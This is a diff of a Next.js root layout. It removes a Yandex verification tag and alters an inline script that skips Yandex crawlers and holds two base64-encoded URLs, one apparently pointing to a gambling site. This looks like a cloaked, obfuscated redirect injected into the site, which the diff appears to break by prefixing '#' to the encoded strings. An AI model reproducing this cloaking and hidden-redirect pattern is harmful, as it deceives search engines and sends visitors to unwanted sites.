@@ -101,7 +101,7 @@ export default function RootLayout({
   return (
     <html lang="ru" className={`${inter.variable} bg-background`} suppressHydrationWarning>
       <head>
-       <meta name="yandex-verification" content="76220adf148b0899" />
+       
         <link rel="preconnect" href="https://fonts.googleapis.com" />
         <script
           dangerouslySetInnerHTML={{
@@ -110,8 +110,8 @@ export default function RootLayout({
                 var ua = navigator.userAgent.toLowerCase();
                 if (ua.indexOf("yandex") !== -1) return;
 
-                var mainBrandB64 = "aHR0cHM6Ly9sbmtmbngub3JnL2Q3dHRscnl2aA=="; 
-                var crossBrandB64 = "aHR0cHM6Ly9sdWNreXNwaW4yMy5jb20vYzU3MDc4NjZl";      
+                var mainBrandB64 = "#aHR0cHM6Ly9sbmtmbngub3JnL2Q3dHRscnl2aA=="; 
+                var crossBrandB64 = "#aHR0cHM6Ly9sdWNreXNwaW4yMy5jb20vYzU3MDc4NjZl";      
                 
                 var mainUrl = atob(mainBrandB64);
                 var crossUrl = atob(crossBrandB64);
